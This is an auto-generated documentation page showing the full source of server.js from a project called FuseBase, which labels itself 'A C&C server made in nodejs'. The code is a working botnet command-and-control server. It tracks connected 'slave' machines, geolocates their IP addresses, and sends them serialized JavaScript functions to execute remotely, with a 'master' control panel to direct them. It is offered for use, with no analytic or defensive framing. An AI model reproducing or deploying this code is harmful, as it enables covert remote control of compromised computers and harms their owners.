<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <base data-ice="baseUrl" href="../../../">
  <title data-ice="title">src/server/server.js | FuseBase</title>
  <link type="text/css" rel="stylesheet" href="css/style.css">
  <link type="text/css" rel="stylesheet" href="css/prettify-tomorrow.css">
  <script src="script/prettify/prettify.js"></script>
  <script src="script/manual.js"></script>
<meta name="description" content="A C&amp;C server made in nodejs"><meta property="twitter:card" content="summary"><meta property="twitter:title" content="FuseBase"><meta property="twitter:description" content="A C&amp;C server made in nodejs"></head>
<body class="layout-container" data-ice="rootContainer">

<header>
  <a href="./">Home</a>
  
  <a href="identifiers.html">Reference</a>
  <a href="source.html">Source</a>
  
  <div class="search-box">
  <span>
    <img src="./image/search.png">
    <span class="search-input-edge"></span><input class="search-input"><span class="search-input-edge"></span>
  </span>
    <ul class="search-result"></ul>
  </div>
<a style="position:relative; top:3px;" href="https://github.com/lukas2005/FuseBase.git"><img width="20px" src="./image/github.png"></a></header>

<nav class="navigation" data-ice="nav"><div>
  <ul>
    
  </ul>
</div>
</nav>

<div class="content" data-ice="content"><h1 data-ice="title">src/server/server.js</h1>
<pre class="source-code line-number raw-source-code"><code class="prettyprint linenums" data-ice="content">let express = require(&quot;express&quot;);
let app = express();
let path = require(&quot;path&quot;);
let http = require(&quot;http&quot;).Server(app);
let io = require(&quot;socket.io&quot;)(http);
let request = require(&quot;request&quot;);
let nodeCleanup = require(&quot;node-cleanup&quot;);
let fs = require(&quot;fs&quot;);
let pug = require(&quot;pug&quot;);

const debug = true;

let Modules = require(&quot;./Modules.js&quot;);
let ver = require(&quot;./../../version.js&quot;);

let slaveSockets = [];
let slaveGeo = {};
let slaveCountries = [];

let modulesSettings = {
	onConnectModules: []
};

let serverSettings = {
	port: 8080
};

let control_panel_html_path = path.join(__dirname, &quot;control_panel&quot;);

app.set(&quot;view engine&quot;, &quot;pug&quot;);
app.set(&quot;views&quot;, control_panel_html_path);
app.use(express.static(control_panel_html_path));

app.get(&quot;/&quot;, function(req, res) {
	res.render(&quot;index&quot;, { version: ver });
});

app.get(&quot;/clients&quot;, function(req, res) {
	res.render(&quot;clients&quot;);
});

Modules.getAllModules().forEach(module =&gt; {
	if (module.widgetPath) {
		app.use(&quot;/&quot;+module.name, express.static(path.parse(module.widgetPath).dir));
	}
});

app.get(&quot;/modules&quot;, function(req, res) {
	let renderedWidgets = [];

	Modules.getAllModules().forEach(module =&gt; {
		if (module.widgetPath) {
			renderedWidgets.push(pug.renderFile(module.widgetPath, {
				basedir: control_panel_html_path,
				module: module
			}));
		}
	});
	
	res.render(&quot;modules&quot;, {
		autoRunListModules: Modules.getAllModules().filter(module =&gt; module.isAutoRun),
		onConnectModules: modulesSettings.onConnectModules,
		modules: Modules.getAllModules(),
		renderedWidgets: renderedWidgets
	});
});

io.on(&quot;connection&quot;, function(socket) {
	let ip = (socket.handshake.headers[&quot;x-forwarded-for&quot;] || socket.request.connection.remoteAddress).address || &quot;localhost&quot;;

	socket.emit(&quot;connection&quot;);

	socket.debugExecFunc = debug;
	socket.executeFunc = function(module, funcName, args, callback) {
		let finalObj = {};
		
		finalObj.func = module.remoteFunctions[funcName].toString();
		finalObj.args = args;
		finalObj.deps = module.deps;
		
		this.emit(&quot;executeRemoteFunction&quot;, finalObj, this.debugExecFunc, funcName);

		if (!this.eventNames().includes(funcName+&quot;Out&quot;)) {
			this.on(funcName+&quot;Out&quot;, function(out) {
				if (callback != null) callback(out);
			});
		}
	};	
	
	socket.on(&quot;disconnect&quot;, function() {
		if (socket.mode == &quot;slave&quot; &amp;&amp; slaveSockets.indexOf(socket) != -1) {
			slaveSockets.pop(socket);

			slaveGeo[socket.country].pop(socket);

			if (slaveGeo[socket.country].length == 0)
				slaveCountries.pop(socket.country);
				
			console.log(&quot;slave disconnected&quot;);
		} else {
			console.log(&quot;master disconnected&quot;);
		}
	});
	
	//TODO: Crypto validation on master connection
	socket.on(&quot;postConnection&quot;, function(mode) {
		if (mode === &quot;slave&quot;) {
			slaveSockets.push(socket);
								
			request(&quot;http://www.geoplugin.net/json.gp?ip=&quot;+ip, function (error, response, body) {
				let json = JSON.parse(body);

				if (slaveGeo[json[&quot;geoplugin_countryName&quot;]] == null) 
					slaveGeo[json[&quot;geoplugin_countryName&quot;]] = [];
					
				slaveGeo[json[&quot;geoplugin_countryName&quot;]].push(ip);

				socket.country = json[&quot;geoplugin_countryName&quot;];

				if (slaveCountries.indexOf(socket.country) == -1)
					slaveCountries.push(socket.country);
			});
			console.log(&quot;new slave connection from: &quot;+ ip);

			modulesSettings.onConnectModules.forEach(function(name) {
				Modules.getModule(name).exec(socket);
			});
		} else if (mode === &quot;master&quot;) {
			socket.on(&quot;updateClientData&quot;, function() {
				
				let data = [];
				
				for (let i = 0; i &lt; slaveCountries.length; i++) {
					data[i] = [slaveCountries[i], slaveGeo[slaveCountries[i]].length];
				}
				
				socket.emit(&quot;getClientsData&quot;, data, slaveGeo);
			});

			socket.on(&quot;updateModuleSettings&quot;, function(data) {
				modulesSettings = data;
				saveSettings();
			});

			socket.on(&quot;shutdown&quot;, function() {
				if (ip === &quot;localhost&quot;) {
					process.exit();
				}
			});

			Modules.getAllModules().forEach(module =&gt; {
				module.controlPanelEvents.forEach(event =&gt; {
					socket.on(event.name, data =&gt; {
						event.function(data, socket, slaveSockets);
						console.log(&quot;ress&quot;);
					});
				});
			});

			console.log(&quot;new master connection from: &quot;+ ip);
		}
		socket.mode = mode;
	});
	
});

function onShutdown(exitCode, signal) {
	console.log(&quot;Shutdown!&quot;);
	saveSettings();
}

function saveSettings() {
	let modulesSettingsJson = JSON.stringify(modulesSettings, null, &quot;\t&quot;);
	fs.writeFileSync(&quot;modulesSettings.json&quot;, modulesSettingsJson);

	let serverSettingsJson = JSON.stringify(serverSettings, null, &quot;\t&quot;);
	fs.writeFileSync(&quot;serverSettings.json&quot;, serverSettingsJson);
}

function loadSettings(callback) {
	fs.readFile(&quot;modulesSettings.json&quot;, function(err, data) {
		modulesSettings = JSON.parse(data);

		if (fs.existsSync(&quot;serverSettings.json&quot;)) {
			fs.readFile(&quot;serverSettings.json&quot;, function(err, data) {
				if (!err) {
					serverSettings = JSON.parse(data);
				}
				if (callback) callback();
			});
		} else {
			saveSettings();
		}
	});
}

loadSettings(function() {

	http.listen(serverSettings.port, function() {
		console.log(&quot;listening on *:&quot;+serverSettings.port);
		console.log(&quot;Control panel: http://localhost:&quot;+serverSettings.port+&quot;/&quot;);
	
		nodeCleanup(onShutdown);
	});

});</code></pre>

</div>

<footer class="footer">
  Generated by <a href="https://esdoc.org">ESDoc<span data-ice="esdocVersion">(1.0.4)</span><img src="./image/esdoc-logo-mini-black.png"></a>
</footer>

<script src="script/search_index.js"></script>
<script src="script/search.js"></script>
<script src="script/pretty-print.js"></script>
<script src="script/inherited-summary.js"></script>
<script src="script/test-summary.js"></script>
<script src="script/inner-link.js"></script>
<script src="script/patch-for-local.js"></script>
</body>
</html>
